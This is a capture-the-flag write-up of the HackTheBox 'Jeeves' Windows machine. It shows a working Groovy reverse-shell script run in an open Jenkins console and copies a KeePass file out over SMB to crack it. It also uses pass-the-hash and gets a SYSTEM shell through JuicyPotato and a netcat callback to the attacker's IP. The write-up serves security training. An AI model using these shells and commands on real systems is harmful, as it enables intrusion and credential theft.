---
title: "HackTheBox - Jeeves"
author: Nasrallah
description: ""
date: 2023-03-23 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, jenkins, passthehash, crack, john]
img_path: /assets/img/hackthebox/machines/jeeves
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [jeeves](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.63
Host is up (0.14s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m58s
| smb2-time: 
|   date: 2023-03-19T13:39:02
|_  start_date: 2023-03-19T13:30:18
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

We found 4 open ports, port 80 is running MS IIS web server, port 135 is MSRPC, port 445 is SMB and port 50000 is Jetty http web server.

## Web

Let's navigate to the web page on port 80.

![](1.png)

We got what looks like a search engine, the links go nowhere but searching for something gives us the following.

![](2.png)

We got an error which would have been useful for us if it was real. By checking the source code we see that this is an image.

```html
<img src="jeeves.PNG" width="90%" height="100%">
```

Checking the source code of the home page we find that whatever we submit we get redirected to this error page.

```html
<form class="form-wrapper cf" action="error.html">
    <div class="byline"><p><a href="#">Web</a>, <a href="#">images</a>, <a href="#">news</a>, and <a href="#">lots of answers</a>.</p></div>
  	<input type="text" placeholder="Search here..." required>
	  <button type="submit">Search</button>
    <div class="byline-bot">Skins</div>
</form>
```

Let's check the other web page.

![](3.png)

We got a 404 error, let's run a directory scan and see what we can find.

```terminal
$ feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.63:50000/ -n            

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.63:50000/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c http://10.10.10.63:50000/askjeeves => http://10.10.10.63:50000/askjeeves/
```

There is a directory called `askjeeves`, let's check it out.

![](4.png)

This is Jenkins admin dashboard and we're not even logged in!

# **Foothold**

To get a reverse shell, we can use `script console` that runs groovy script and execute the following code:

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![](5.png)

We setup a listener and click run

![](6.png)

We got a shell!


# **Privilege Escalation**

## Method 1

Checking `kohsuke`'s Documents directory, we find a keepass file called `CEH.kdbx`.

To download the file, i setup an smb server with the following command

```bash
impacket-smbserver share ./share -smb2support
```

Then on the target i run the following command

```powershell
copy CEH.kdbx \\10.10.17.90\share
```

The file is encrypted and we need a password to read it.

Using `keepass2john` can extract the hash and then crack it using `john`.

![](7.png)

We got the password now we can open the keepass file.

![](8.png)

We find multiple passwords and one `NTLM` hash.

Tried to connect with the clear text password but none of them worked.

We couldn't crack the NTLM hash, but we can try the `passthehash` attack using `psexec`

![](9.png)

## Method 2

Let's check our privileges.

```terminal
C:\Users\Administrator\.jenkins>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```

We have `SeImpersonatePrivilege`, this means we can use [JuicyPotato](https://github.com/ohpe/juicy-potato/releases) to get system privileges.

First we upload juicyPotato executable and a copy of netcat.

```powershell
powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.17.90/JuicyPotato.exe', 'Potato.exe')
powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.17.90/nc.exe', 'nc.exe')
```

Then we run the following command that would send us a reverse shell

```powershell
Potato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\kohsuke\desktop\nc.exe -e cmd.exe 10.10.17.90 9002" -t *
```

![](11.png)

Finally to get the root flag, we go administrator's desktop, run `dir /r` to see alternative data stream.

We find a file called `hm.txt:root.txt`, which is a file withing a file, to read is run `more < hm.txt:root.txt`

For more information of data streams check this [article](https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).